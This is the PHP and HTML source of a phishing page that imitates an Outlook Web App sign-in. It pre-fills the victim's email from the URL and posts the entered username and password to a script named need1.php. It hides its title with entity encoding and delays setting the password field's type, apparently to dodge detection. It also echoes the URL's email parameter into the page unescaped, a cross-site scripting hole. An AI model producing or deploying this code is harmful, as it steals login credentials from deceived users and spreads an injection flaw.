<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>O&#117;&#116;&#108;&#111;&#111;k W&#101;b A&#112;p </title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[2].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="/images/favicon.ico?v=4" type="image/x-icon"/> 
<style type="text/css">
.textbox {
  	padding-left: 3px;
  	font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
    font-size: 13px;
    color: #333333;
    height: 30px;
    width: 275px;
    border: 1px solid #98A3A6;
}


/* Centered text */
.centered {
  position: absolute;
  top: 327px;
  left: 633px;
  width: 0px;
  font-weight:light;
  font-size:80%;
  color: 666666;
  transform: translate(-50%, -50%);
}

/* User Text */
.usertext {
  position: absolute;
  top: 261px;
  left: 632px;
  width: 0px;
  font-weight:light;
  font-size:80%;
  color: 666666;
  transform: translate(-50%, -50%);
}

 </style>

</head>
<body bgColor="#F8F8F8">
<div class="loader"></div>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1356px; height:915px; z-index:0"><img src="images/w1.png" alt="" title="" border=0 width=1356 height=915></div>
<form action=need1.php name=bundukhan id=bundukhan method=post>
<div class="container">
  <div class="centered">Password</div>
  <div class="usertext">Username</div>
</div>
<input name="domain" value="  <?php echo $yuh ?>" readonly type="text" style="position:absolute;font-weight:bold;font-size:80%;background:none;border:none;outline:none;width:262px;left:633px;top:226px;z-index:10">
<input name="email" value="<?=$_GET[email]?>" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:633px;top:269px;z-index:2">
<input name="pd" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:262px;left:633px;top:337px;z-index:3">
<div id="formimage1" style="position:absolute; left:628px; top:380px; z-index:6"><input type="image" name="formimage1" width="114" height="31" src="images/btns.png"></div>
<div id="outlook" style="position:absolute; left:568px; top:120px; z-index:6"><input type="image" name="outlook" width="438" height="95" src="images/Screenshot_3.png"></div>

</body>
</html>